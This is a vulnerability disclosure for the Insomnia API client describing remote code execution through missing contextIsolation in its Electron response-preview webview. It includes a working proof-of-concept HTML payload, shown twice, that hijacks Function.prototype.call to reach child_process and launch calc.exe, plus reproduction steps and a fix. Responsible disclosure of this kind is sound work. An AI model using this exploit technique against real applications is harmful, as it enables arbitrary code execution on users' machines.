# RCE through missing contextIsolation

## Summary

The webview for previewing and rendering HTTP-responses does not have [contextIsolation](https://www.electronjs.org/docs/tutorial/context-isolation) enabled. This allows remote attackers to execute arbitrary code if a user requests a malicious website or an attacker can perform a MitM-attack and alter the HTTP response.

## Description

By default the application allows the execution of JavaScript in HTML previews of HTTP-responses.
There is an option where a user can disable this behavior, but by default JavaScript is allowed.

When a HTML-like response for a request is received, a `ResponseWebview` element will be created: https://github.com/Kong/insomnia/blob/a36e22c294d22174f1a7ac03ed21f6204b192891/packages/insomnia-app/app/ui/components/viewers/response-viewer.js#L318
This is basically a wrapper around a `<webview>`-tag (https://github.com/Kong/insomnia/blob/a36e22c294d22174f1a7ac03ed21f6204b192891/packages/insomnia-app/app/ui/components/viewers/response-web-view.js) that loads the response converted to a data-URL.
In the `<webview>` only the option, whether JavaScript is enabled or not is set (`webpreferences="javascript=yes"`), the other options are inherited of the main window, where the following options are set: 
```js
webPreferences: {
    zoomFactor: zoomFactor,
    nodeIntegration: true,
    webviewTag: true,
    enableRemoteModule: true,
},
```
https://github.com/Kong/insomnia/blob/07f9fa676ed8f2e7ea72e5374d69dcb960e32ca9/packages/insomnia-app/app/main/window-utils.js#L66

The version of Electron that Insomnia uses is `9.1.1` as can be seen by navigating to "Help" > "About" in the application menu.
The default value of `contextIsolation` in this Electron version is `false`.

Missing `contextIsolation` allows an attacker to get access to Electron or Node.js APIs by overwriting JavaScript functions which might be later called in a context which has access to Node.js APIs.
By overwriting standard JavaScript functions like `Function.prototype.call`, the website which is loaded in the `<webview>` without access to Node.js APIs can get access to them when the overwritten function is executed in the context of Electron or application specific (in this case Insomnia) code.
For example when the overriden function is used in the application code and called with an object as argument that has access to the Nodes.js `child_process` module, it can be accessed inside the function provided as a replacement.
See this [link](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en) for the original details about exploiting missing `contextIsolation`.

So when a malicious website provides the following content for example:
```html
<html>
<head>
<script>
const handler = {
  apply: function(target, thisArg, argumentsList) {
    console.log(target, thisArg, argumentsList);
    if (argumentsList.length === 4 && argumentsList[3].name === "__webpack_require__") {
        argumentsList[3].m.module(Array.prototype)
        Array.prototype.exports.createRequire("/")("child_process").spawnSync("calc.exe")
    }
    return Reflect.apply(target, thisArg, argumentsList);
  }
};
Function.prototype.call = new Proxy(Function.prototype.call, handler);
</script>
</head>
<body>
<textarea contenteditable spellcheck="true">
clck and correkt mee
</textarea>
test.html
</body>
</html>
```

And a user sends a request to the website (or an attacker controls the response in a MitM-Style attack), then the user right clicks on the misspelled word and clicks on a suggestion, the attackers payload will get executed.

In this case a npm package called "electron-context-menu", is utilized.
It is created in the [main window](https://github.com/Kong/insomnia/blob/07f9fa676ed8f2e7ea72e5374d69dcb960e32ca9/packages/insomnia-app/app/main/window-utils.js#L501) and also affects subwindows like the webview.
It simply adds a context menu with a few default features.
One of those is responsible for correcting misspelled words by right clicking on the word and choosing one of the suggested corrections.

This is just one possible execution chain, there might be further "gadgets" which would allow code execution even without any user interaction.


## Environment/Affected Software

Tested with: 
- Insomnia Core 2020.5.1
- Insomnia 2021.1.1

OS: Windows 10

## Steps to Reproduce

1. Start a local webserver which serves the following HTML-file:
```html
<html>
<head>
<script>
const handler = {
  apply: function(target, thisArg, argumentsList) {
    console.log(target, thisArg, argumentsList);
    if (argumentsList.length === 4 && argumentsList[3].name === "__webpack_require__") {
        argumentsList[3].m.module(Array.prototype)
        Array.prototype.exports.createRequire("/")("child_process").spawnSync("calc.exe")
    }
    return Reflect.apply(target, thisArg, argumentsList);
  }
};
Function.prototype.call = new Proxy(Function.prototype.call, handler);
</script>
</head>
<body>
<textarea contenteditable spellcheck="true">
clck and correkt mee
</textarea>
test.html
</body>
</html>
```

2. In Insomnia create a new request targeting the URL where the file from step 1 is located.

3. Send the request.

4. Right click on a misspelled word in the textarea and then click on one of the suggested words in the contextmenu.



## Suggested Solution

The option `contextIsolation` should be set to `true`, especially in the webview for rendering HTML previews of HTTP-responses.
See: https://www.electronjs.org/docs/tutorial/security#3-enable-context-isolation-for-remote-content
